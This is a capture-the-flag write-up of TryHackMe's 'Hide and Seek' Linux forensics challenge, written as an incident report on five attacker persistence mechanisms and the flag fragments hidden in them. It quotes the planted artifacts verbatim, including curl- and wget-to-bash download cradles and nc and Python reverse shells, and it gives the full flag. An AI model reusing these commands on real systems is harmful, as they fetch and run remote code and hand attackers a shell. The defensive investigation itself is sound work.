# TryHackMe — Hide and Seek

## Forensic Investigation Report

### 1. Executive Summary

The **Hide and Seek** challenge involved performing a live forensic investigation of a compromised Linux system to identify persistence mechanisms implanted by an attacker known as **Cipher**.

The attacker left a note containing five clues. Each clue corresponded to a different Linux persistence mechanism. The investigation identified persistence through:

1. Cron jobs
2. SSH authorized keys
3. Bash startup configuration
4. A systemd service
5. MOTD login scripts

Each persistence mechanism contained an encoded fragment of the final flag. The fragments were recovered through hexadecimal and Base64 decoding and reconstructed to obtain the final flag:

```text
THM{y0u_g0t_3v3ryth1ng_d0wn}
```

---

## 2. Investigation Objective

The objective was to conduct a live system analysis and determine how the attacker maintained access to the compromised system.

The attacker's note provided the following clues:

> “Time is on my side, always running like clockwork.”

> “A secret handshake gets me in every time.”

> “Whenever you set the stage, I make my entrance.”

> “I run with the big dogs, booting up alongside the system.”

> “I love welcome messages.”

The investigation mapped each clue to a Linux persistence mechanism.

---

## 3. Methodology

The investigation followed a clue-driven forensic approach.

For each clue:

1. Identify the likely persistence mechanism.
2. Locate the relevant configuration or persistence artifact.
3. Inspect the artifact without executing suspicious payloads.
4. Identify encoded or obfuscated data.
5. Decode the data using appropriate tools.
6. Record the corresponding flag fragment.
7. Reconstruct the final flag after all five fragments were recovered.

The investigation primarily used standard Linux commands such as:

```bash
cat
ls
find
grep
xxd
base64
crontab
systemctl
```

No suspicious payloads were intentionally executed during the investigation.

---

# 4. Findings

## 4.1 Cron Persistence

### Clue

> “Time is on my side, always running like clockwork.”

This clue indicated a scheduled task or cron-based persistence mechanism.

### Evidence

The root user's crontab was examined:

```bash
sudo crontab -l -u root
```

A suspicious job was identified:

```text
* * * * * /bin/bash -c 'echo Y3VybCAtcyA1NDQ4NGQ3Yjc5MzAuc3RvcmFnM19jMXBoM3JzcXU0ZC5uZXQvYS5zaCB8IGJhc2gK | base64 -d | bash 2>/dev/null'
```

The job was configured to execute **every minute**.

### Analysis

The embedded Base64 string was decoded:

```bash
echo 'Y3VybCAtcyA1NDQ4NGQ3Yjc5MzAuc3RvcmFnM19jMXBoM3JzcXU0ZC5uZXQvYS5zaCB8IGJhc2gK' | base64 -d
```

Result:

```text
curl -s 54484d7b7930.storag3_c1ph3rsqu4d.net/a.sh | bash
```

The hexadecimal portion of the hostname was then decoded:

```bash
echo "54484d7b7930" | xxd -r -p
```

Result:

```text
THM{y0
```

### Finding

**Persistence mechanism:** Root cron job

**Flag fragment:**

```text
THM{y0
```

---

## 4.2 SSH Key Persistence

### Clue

> “A secret handshake gets me in every time.”

This clue suggested SSH authentication persistence.

### Evidence

SSH authorized key files were searched:

```bash
find /home /root -type f -name authorized_keys -print 2>/dev/null
```

A suspicious file was identified:

```text
/home/zeroday/.ssh/.authorized_keys
```

The file contained an SSH public key with an unusual encoded comment:

```text
326e6420706172743a20755f6730745f.local
```

### Analysis

The hexadecimal portion was decoded:

```bash
echo "326e6420706172743a20755f6730745f" | xxd -r -p
```

Result:

```text
2nd part: u_g0t_
```

### Finding

**Persistence mechanism:** SSH authorized key

**Flag fragment:**

```text
u_g0t_
```

---

## 4.3 Bash Startup Persistence

### Clue

> “Whenever you set the stage, I make my entrance.”

This clue suggested a shell initialization or startup file.

### Evidence

The Bash configuration for the `specter` user was examined:

```bash
sudo cat /home/specter/.bashrc
```

A suspicious reverse-shell command was found:

```text
nc -e /bin/bash 4d334a6b58334130636e513649444e324d334a3564416f3d.cipher.io 443 2>/dev/null
```

### Analysis

The hexadecimal string was decoded:

```bash
echo "4d334a6b58334130636e513649444e324d334a3564416f3d" | xxd -r -p
```

Result:

```text
M3JkX3A0cnQ6IDN2M3J5dAo=
```

The resulting value was Base64 decoded:

```bash
echo "M3JkX3A0cnQ6IDN2M3J5dAo=" | base64 -d
```

Result:

```text
3rd_p4rt: 3v3ryt
```

### Finding

**Persistence mechanism:** Bash startup file

**Location:**

```text
/home/specter/.bashrc
```

**Flag fragment:**

```text
3v3ryt
```

---

## 4.4 Systemd Service Persistence

### Clue

> “I run with the big dogs, booting up alongside the system.”

This clue indicated a system-level service configured to start with the operating system.

### Evidence

Systemd service files were inspected:

```bash
ls -la /lib/systemd/system/
```

A suspicious service named:

```text
cipher.service
```

was identified.

The service was located at:

```text
/lib/systemd/system/cipher.service
```

### Analysis

The service definition was examined:

```bash
sudo cat /lib/systemd/system/cipher.service
```

The `ExecStart` directive contained:

```text
wget NHRoIHBhcnQgLSBoMW5nXyAK.s1mpl3bd.com --output - | bash 2>/dev/null
```

The Base64 component was decoded:

```bash
echo "NHRoIHBhcnQgLSBoMW5nXyAK" | base64 -d
```

Result:

```text
4th part - h1ng_
```

### Finding

**Persistence mechanism:** Systemd service

**Service:**

```text
cipher.service
```

**Flag fragment:**

```text
h1ng_
```

---

## 4.5 MOTD Persistence

### Clue

> “I love welcome messages.”

This clue pointed toward the Linux Message of the Day system.

### Evidence

The MOTD configuration directory was examined:

```bash
ls -la /etc/update-motd.d/
```

The `00-header` script was inspected:

```bash
cat /etc/update-motd.d/00-header
```

A suspicious Python reverse-shell command was discovered:

```text
python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("4c61737420706172743a206430776e7d0.h1dd3nd00r.n3t",)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
```

### Analysis

The hexadecimal component was decoded:

```bash
echo "4c61737420706172743a206430776e7d0" | xxd -r -p
```

Result:

```text
Last part: d0wn}
```

### Finding

**Persistence mechanism:** MOTD/login script

**Location:**

```text
/etc/update-motd.d/00-header
```

**Flag fragment:**

```text
d0wn}
```

---

# 5. Flag Reconstruction

The five recovered fragments were:

| Order | Persistence Mechanism | Fragment |
| ----: | --------------------- | -------- |
|     1 | Cron                  | `THM{y0` |
|     2 | SSH authorized key    | `u_g0t_` |
|     3 | Bash startup file     | `3v3ryt` |
|     4 | Systemd service       | `h1ng_`  |
|     5 | MOTD script           | `d0wn}`  |

Combining the fragments:

```text
THM{y0 + u_g0t_ + 3v3ryt + h1ng_ + d0wn}
```

Produces the final flag:

```text
THM{y0u_g0t_3v3ryth1ng_d0wn}
```

---

# 6. Persistence Timeline

The attacker established persistence through multiple independent mechanisms:

```text
Cron
  │
  ├── Executes every minute
  │
  ▼
SSH authorized key
  │
  ├── Provides persistent SSH authentication
  │
  ▼
.bashrc
  │
  ├── Executes when the user's shell starts
  │
  ▼
Systemd service
  │
  ├── Provides system-level startup persistence
  │
  ▼
MOTD script
  │
  └── Executes during login/welcome message processing
```

The use of multiple persistence mechanisms demonstrates redundancy: removing one mechanism would not necessarily remove the attacker's access.

---

# 7. Indicators of Compromise

The following artifacts were identified during the investigation:

### Cron

```text
Root crontab
```

Suspicious domain:

```text
storag3_c1ph3rsqu4d.net
```

### SSH

```text
/home/zeroday/.ssh/.authorized_keys
```

### Bash

```text
/home/specter/.bashrc
```

Suspicious domain:

```text
cipher.io
```

### Systemd

```text
/lib/systemd/system/cipher.service
```

Suspicious domain:

```text
s1mpl3bd.com
```

### MOTD

```text
/etc/update-motd.d/00-header
```

Suspicious domain:

```text
h1dd3nd00r.n3t
```

---

# 8. Conclusion

The investigation successfully identified all five persistence mechanisms planted by Cipher.

The attacker used several common Linux persistence techniques, including scheduled execution, SSH key authentication, shell initialization, systemd services, and MOTD scripts.

The persistence artifacts also used **Base64 and hexadecimal encoding** to conceal portions of the malicious commands and flag fragments.

The five clues provided a reliable roadmap for locating the implants, while the encoded data embedded within each artifact provided the individual flag fragments.

The complete flag recovered from the compromised system was:

```text
THM{y0u_g0t_3v3ryth1ng_d0wn}
```

## Final Assessment

The compromised host contained **multiple redundant persistence mechanisms**, indicating that the attacker intended to maintain access even if one persistence method was discovered or removed.

From a defensive perspective, a thorough Linux compromise investigation should therefore examine multiple persistence locations rather than relying on a single artifact or technique.